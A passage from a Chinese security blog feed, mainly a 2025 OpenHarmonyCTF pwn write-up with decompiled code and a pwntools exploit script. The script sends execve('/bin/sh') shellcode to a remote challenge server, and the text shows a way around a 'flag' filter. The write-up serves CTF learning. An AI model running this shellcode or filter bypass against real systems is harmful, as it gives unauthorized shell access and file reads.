href="https://blog.csdn.net/qq_44223394/article/details/128756188">从零到一：复现 DIR-815 栈溢出漏洞_dir815漏洞复现-CSDN博客</a></p><p><a href="https://www.uf4te.cn/posts/3fd254db.html#%E6%9F%A5%E7%9C%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E5%B1%9E%E6%80%A7">😘欢迎回来~ | 坠入星野的月🌙</a></p><p><a href="https://zikh26.github.io/posts/d1f081a9.html?highlight=mips#EXP-2">D-Link DIR-815路由器溢出漏洞分析 | ZIKH26's Blog</a></p><p><a href="https://www.uf4te.cn/posts/c2233a9.html#%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%90%91-httpd-%E6%9C%8D%E5%8A%A1%E5%8F%91%E9%80%81-HTTP-%E6%8A%A5%E6%96%87">CNVD-2013-11625复现 | 坠入星野的月🌙</a></p><p>‍</p>]]></content>
    
    
    <summary type="html">DIR-815漏洞复现</summary>
    
    
    
    <category term="Router" scheme="https://www.thir0th.xyz/categories/Router/"/>
    
    
    <category term="IOT" scheme="https://www.thir0th.xyz/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>0penHarmonyCTF-pwn</title>
    <link href="https://www.thir0th.xyz/posts/906b7d18.html"/>
    <id>https://www.thir0th.xyz/posts/906b7d18.html</id>
    <published>2025-06-11T09:53:35.000Z</published>
    <updated>2025-06-25T13:27:35.454Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>2025 0penHarmonyCTF(部分)</h1><h2 id="PWN">PWN</h2><h3 id="mini-shell">mini-shell</h3><p>一开始拿到是比较唬人的，本地启动一下就发现程序主进程就是minishell这个二进制文件，而且可以用binwalk直接分离出来二进制文件</p><p>cat能执行shellcode，但会将寄存器清空包括rsp,rbp，跟2025vnctf一道题一模一样了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // edx</span><br><span class="line">  int v4; // ecx</span><br><span class="line">  int v5; // r8d</span><br><span class="line">  int v6; // r9d</span><br><span class="line">  int v7; // edx</span><br><span class="line">  int v8; // ecx</span><br><span class="line">  int v9; // r8d</span><br><span class="line">  int v10; // r9d</span><br><span class="line">  char v12; // [rsp+0h] [rbp-20h]</span><br><span class="line">  _BYTE argva[10]; // [rsp+Eh] [rbp-12h] BYREF</span><br><span class="line">  unsigned __int64 v14; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(0x28u);</span><br><span class="line">  init_0(argc, argv, envp);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf((unsigned int)&quot;minishell$ &quot;, (_DWORD)argv, v3, v4, v5, v6, v12);</span><br><span class="line">    if ( !fgets(argva, 10LL, stdin) )</span><br><span class="line">      break;</span><br><span class="line">    argva[j_strcspn_ifunc(argva, &quot;\n&quot;)] = 0;</span><br><span class="line">    argv = (const char **)&quot;exit&quot;;</span><br><span class="line">    if ( !(unsigned int)j_strncmp_ifunc(argva, &quot;exit&quot;, 4LL) )</span><br><span class="line">      break;</span><br><span class="line">    if ( argva[0] )</span><br><span class="line">    &#123;</span><br><span class="line">      argv = (const char **)&quot;ls&quot;;</span><br><span class="line">      if ( (unsigned int)j_strncmp_ifunc(argva, &quot;ls&quot;, 2LL) )</span><br><span class="line">      &#123;</span><br><span class="line">        argv = (const char **)&quot;clear&quot;;</span><br><span class="line">        if ( (unsigned int)j_strncmp_ifunc(argva, &quot;clear&quot;, 5LL) )</span><br><span class="line">        &#123;</span><br><span class="line">          argv = (const char **)&quot;whoami&quot;;</span><br><span class="line">          if ( (unsigned int)j_strncmp_ifunc(argva, &quot;whoami&quot;, 6LL) )</span><br><span class="line">          &#123;</span><br><span class="line">            argv = (const char **)&quot;pwd&quot;;</span><br><span class="line">            if ( (unsigned int)j_strncmp_ifunc(argva, &quot;pwd&quot;, 3LL) )</span><br><span class="line">            &#123;</span><br><span class="line">              argv = (const char **)&quot;cat&quot;;</span><br><span class="line">              if ( (unsigned int)j_strncmp_ifunc(argva, &quot;cat&quot;, 3LL) )</span><br><span class="line">              &#123;</span><br><span class="line">                argv = (const char **)argva;</span><br><span class="line">                printf((unsigned int)&quot;Command not supported: %s\n&quot;, (unsigned int)argva, v7, v8, v9, v10, v12);</span><br><span class="line">              &#125;</span><br><span class="line">              else</span><br><span class="line">              &#123;</span><br><span class="line">                cat();</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">              pwd();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">            whoami();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          clear();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        ls();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cat</p><p><img src="https://s2.loli.net/2025/06/11/iFo38PvuOMxYHTp.png" alt="image"></p><p>exec</p><p><img src="https://s2.loli.net/2025/06/11/Jw4BdhLEzPfnDKI.png" alt="image"></p><p>一开始是用的mov rsp, fs:[0x300]，去恢复栈空间，构造read再读入shellcode，本地确实是通了，远程不通，就去搜了vnctf当时的题，发现了这个很短的shellcode，本地和远程都可以通</p><p><a href="https://z-bosh.github.io/2025/02/11/VNCTF-2025/">VNCTF-2025 | Bosh's Blog</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr(size):</span><br><span class="line">return u64(p.recv(size).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./minishell&#x27;)</span><br><span class="line">p=remote(&#x27;61.147.171.107&#x27;,42114)</span><br><span class="line">#p = process(&#x27;./minishell&#x27;)</span><br><span class="line"></span><br><span class="line">rl(&quot;minishell$&quot;)</span><br><span class="line">sl(b&#x27;cat&#x27;)</span><br><span class="line">pause()</span><br><span class="line">#sleep(0.5)</span><br><span class="line"></span><br><span class="line">shellcode=asm(&#x27;&#x27;&#x27;</span><br><span class="line">mov al,59</span><br><span class="line">add rdi,8</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;)+b&#x27;/bin/sh\x00&#x27;</span><br><span class="line"></span><br><span class="line">#bug()</span><br><span class="line">li(hex(len(shellcode)))</span><br><span class="line">sl(shellcode)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">#sleep(0.5)</span><br><span class="line">pause()</span><br><span class="line">shell=b&#x27;\x90&#x27;*(0x60)+asm(shellcraft.sh())</span><br><span class="line">sl(shell)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p>‍</p><h3 id="ezshell（复现）">ezshell（复现）</h3><p>跟第一题一样，将二进制文件分离出来，首先定位到隐藏函数</p><p><img src="https://s2.loli.net/2025/06/11/c5al4odFxQsLWMy.png" alt="image"></p><p>检测第一部分!devmode，检测后续参数，sub_40135f中规定了参数的输入格式</p><p><img src="https://s2.loli.net/2025/06/11/Mih5nBRESNgF47Q.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall sub_40135F(__int64 a1, int UMU)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // r8d</span><br><span class="line">  int v3; // r9d</span><br><span class="line">  int v4; // edx</span><br><span class="line">  int v5; // ecx</span><br><span class="line">  int v6; // r8d</span><br><span class="line">  int v7; // r9d</span><br><span class="line">  int i_1; // edx</span><br><span class="line">  int v9; // ebx</span><br><span class="line">  int i; // [rsp+14h] [rbp-2Ch]</span><br><span class="line">  _BYTE *v12; // [rsp+18h] [rbp-28h]</span><br><span class="line">  unsigned __int64 i_2; // [rsp+20h] [rbp-20h]</span><br><span class="line">  _QWORD *v14; // [rsp+28h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  i_2 = sub_40A140(a1);</span><br><span class="line">  if ( i_2 % 3 )</span><br><span class="line">    sub_4042DE((unsigned int)&quot;Invalid argument!&quot;, UMU, i_2 % 3, i_2 % 3, v2, v3);</span><br><span class="line">  v14 = (_QWORD *)sub_405301(i_2 / 3 + 8);</span><br><span class="line">  if ( !v14 )</span><br><span class="line">    sub_4042DE((unsigned int)&quot;Memory allocation failed!&quot;, UMU, v4, v5, v6, v7);</span><br><span class="line">  *v14 = i_2 / 3 + 8;</span><br><span class="line">  v12 = v14 + 1;</span><br><span class="line">  for ( i = 0; i &lt; i_2; i += 3 )</span><br><span class="line">  &#123;</span><br><span class="line">    i_1 = i;</span><br><span class="line">    if ( *(_BYTE *)(i + a1) != 92</span><br><span class="line">      || !(unsigned int)sub_4012E3((unsigned int)*(char *)(i + 1LL + a1))</span><br><span class="line">      || !(unsigned int)sub_4012E3((unsigned int)*(char *)(i + 2LL + a1)) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4042DE((unsigned int)&quot;Invalid argument!&quot;, UMU, i_1, v5, v6, v7);</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = 16 * sub_401312((unsigned int)*(char *)(i + 1LL + a1));</span><br><span class="line">    *v12++ = v9 + sub_401312((unsigned int)*(char *)(i + 2LL + a1));</span><br><span class="line">  &#125;</span><br><span class="line">  return v14;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入格式为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/61/  #a，二位ascil码</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">\ad\51\57\51 打开 Advanced features</span><br><span class="line">\ff 当打开 Advanced features 后尝试读取 /flag</span><br><span class="line">\bc 当打开 Advanced features 后尝试读取 `/proc/cpuinfo``</span><br><span class="line">\ea[string 的 opcode格式] 当打开 Advanced features 后为字符串创建 shortcut，如 \ea\66\6c\61，同时以 $&#123;index&#125; 的格式调用</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>ff，bc都可以读取flag</p><p><img src="https://s2.loli.net/2025/06/11/oyO9GnJ61zaHqBd.png" alt="image"></p><p><img src="https://s2.loli.net/2025/06/11/EnmzthdoZiWP254.png" alt="image"></p><p>但要想执行这个需要满足v12不为空，就需要利用ad</p><p><img src="https://s2.loli.net/2025/06/11/i8rohDxY6FsZnzX.png" alt="image"></p><p>‍</p><p>ea功能就比较重要，就是创建快捷方式，利用shortcut可以创建参数</p><p><img src="https://s2.loli.net/2025/06/11/u23f8RAXqVWokjr.png" alt="image"></p><ul><li><strong>更新 UMU</strong>：LODWORD(UMU) = n9 - 1，记录刚添加的快捷方式索引。</li><li><strong>打印信息</strong>：sub_4073F6（可能是 printf）输出“Shortcut %d added: %s\n”，显示索引（n9 - 1）和内容（dst）。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_403F9E(__int64 dst)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // ecx</span><br><span class="line">  int v2; // r8d</span><br><span class="line">  int v3; // r9d</span><br><span class="line">  int v4; // ecx</span><br><span class="line">  int v5; // r8d</span><br><span class="line">  int v6; // r9d</span><br><span class="line">  int n9; // ebx</span><br><span class="line">  __int64 v8; // rax</span><br><span class="line">  int v9; // r8d</span><br><span class="line">  int v10; // r9d</span><br><span class="line">  __int64 v11; // rcx</span><br><span class="line">  __int64 v12; // rdx</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  if ( sub_40A5A0(dst, &quot;$&#123;&quot;) || sub_409FD5(dst, &#x27;&#125;&#x27;) )</span><br><span class="line">    sub_4042DE((unsigned int)&quot;Invalid shortcut: %s&quot;, dst, (unsigned int)&quot;Invalid shortcut: %s&quot;, v1, v2, v3);</span><br><span class="line">  if ( sub_40A5A0(dst, &quot;flag&quot;) )</span><br><span class="line">    sub_4042DE((unsigned int)&quot;Invalid shortcut: %s&quot;, dst, (unsigned int)&quot;Invalid shortcut: %s&quot;, v4, v5, v6);</span><br><span class="line">  n9 = n9;</span><br><span class="line">  v8 = sub_4043D4(dst);</span><br><span class="line">  v11 = 8LL * n9;</span><br><span class="line">  *(_QWORD *)((char *)&amp;unk_4106C0 + v11) = v8;</span><br><span class="line">  v12 = 8LL * n9;</span><br><span class="line">  if ( !*(_QWORD *)((char *)&amp;unk_4106C0 + v12) )</span><br><span class="line">    sub_4042DE((unsigned int)&quot;str_dup failed&quot;, (unsigned int)&quot;flag&quot;, v12, v11, v9, v10);</span><br><span class="line">  result = (unsigned int)++n9;</span><br><span class="line">  if ( n9 &gt; 9 )</span><br><span class="line">    n9 = 0;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>‍</p><p>sub_40127A 会将 psub_403703 赋值回 sub_403703 此时就可以在直接在 shell 中调用 cat 了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_403703(__int64 a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  int v3; // edx</span><br><span class="line">  int v4; // ecx</span><br><span class="line">  int v5; // r8d</span><br><span class="line">  int v6; // r9d</span><br><span class="line">  int v7; // ecx</span><br><span class="line">  int v8; // r8d</span><br><span class="line">  int v9; // r9d</span><br><span class="line">  int v10; // edx</span><br><span class="line">  int v11; // ecx</span><br><span class="line">  int v12; // r8d</span><br><span class="line">  int v13; // r9d</span><br><span class="line">  int v14; // ecx</span><br><span class="line">  int v15; // r8d</span><br><span class="line">  int v16; // r9d</span><br><span class="line">  int v17; // ecx</span><br><span class="line">  int v18; // r8d</span><br><span class="line">  int v19; // r9d</span><br><span class="line">  char n46; // [rsp+1Fh] [rbp-21h]</span><br><span class="line">  __int64 v21; // [rsp+28h] [rbp-18h]</span><br><span class="line">  char *filename; // [rsp+30h] [rbp-10h]</span><br><span class="line">  __int64 v23; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  result = sub_40A140(a1);</span><br><span class="line">  if ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 = sub_4040E8(a1);</span><br><span class="line">    if ( !v21 )</span><br><span class="line">      sub_4042DE((unsigned int)&quot;path translation failed&quot;, a2, v3, v4, v5, v6);</span><br><span class="line">    if ( (unsigned int)sub_40497C(v21) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_405067(v21);</span><br><span class="line">      filename = (char *)sub_4048B7(v21);</span><br><span class="line">      if ( !filename )</span><br><span class="line">        sub_4042DE((unsigned int)&quot;path translation failed&quot;, a2, v10, v11, v12, v13);</span><br><span class="line">      if ( sub_40A5A0(a1, &quot;flag&quot;) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_4073F6(</span><br><span class="line">          (unsigned int)&quot;cat: %s: Permission denied\n&quot;,</span><br><span class="line">          a1,</span><br><span class="line">          (unsigned int)&quot;cat: %s: Permission denied\n&quot;,</span><br><span class="line">          v14,</span><br><span class="line">          v15,</span><br><span class="line">          v16);</span><br><span class="line">        return sub_405067(filename);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        v23 = sub_406F83(filename);</span><br><span class="line">        if ( v23 )</span><br><span class="line">        &#123;</span><br><span class="line">          while ( 1 )</span><br><span class="line">          &#123;</span><br><span class="line">            n46 = sub_406F44(v23, &quot;rb&quot;);</span><br><span class="line">            if ( n46 == -1 )</span><br><span class="line">              break;</span><br><span class="line">            if ( (unsigned int)(n46 - 32) &lt;= 0x5E || n46 == 10 || n46 == 13 )</span><br><span class="line">              sub_40755B((unsigned int)n46);</span><br><span class="line">            else</span><br><span class="line">              sub_40755B(46LL);</span><br><span class="line">          &#125;</span><br><span class="line">          sub_406CBC(v23);</span><br><span class="line">          return sub_405067(filename);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          sub_4073F6(</span><br><span class="line">            (unsigned int)&quot;cat: cannot open &#x27;%s&#x27; for reading\n&quot;,</span><br><span class="line">            a1,</span><br><span class="line">            (unsigned int)&quot;cat: cannot open &#x27;%s&#x27; for reading\n&quot;,</span><br><span class="line">            v17,</span><br><span class="line">            v18,</span><br><span class="line">            v19);</span><br><span class="line">          return sub_405067(filename);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      return sub_4073F6(</span><br><span class="line">               (unsigned int)&quot;cat: %s: Permission denied\n&quot;,</span><br><span class="line">               a1,</span><br><span class="line">               (unsigned int)&quot;cat: %s: Permission denied\n&quot;,</span><br><span class="line">               v7,</span><br><span class="line">               v8,</span><br><span class="line">               v9);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2025/06/11/TJkqK9CIQ5Zjnh4.png" alt="image"></p><p>先提权（个人理解为提权），然后创建好字符串的快捷方式，然后cat调用，但注意，这里对快捷方式有检测，不能是flag字符串，但可以拼接绕过<img src="https://s2.loli.net/2025/06/11/XKugL1xpeRGvo9h.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_403703(__int64 a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  int v3; // edx</span><br><span class="line">  int v4; // ecx</span><br><span class="line">  int v5; // r8d</span><br><span class="line">  int v6; // r9d</span><br><span class="line">  int v7; // ecx</span><br><span class="line">  int v8; // r8d</span><br><span class="line">  int v9; // r9d</span><br><span class="line">  int v10; // edx</span><br><span class="line">  int v11; // ecx</span><br><span class="line">  int v12; // r8d</span><br><span class="line">  int v13; // r9d</span><br><span class="line">  int v14; // ecx</span><br><span class="line">  int v15; // r8d</span><br><span class="line">  int v16; // r9d</span><br><span class="line">  int v17; // ecx</span><br><span class="line">  int v18; // r8d</span><br><span class="line">  int v19; // r9d</span><br><span class="line">  char n46; // [rsp+1Fh] [rbp-21h]</span><br><span class="line">  __int64 v21; // [rsp+28h] [rbp-18h]</span><br><span class="line">  char *filename; // [rsp+30h] [rbp-10h]</span><br><span class="line">  __int64 v23; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  result = sub_40A140(a1);</span><br><span class="line">  if ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 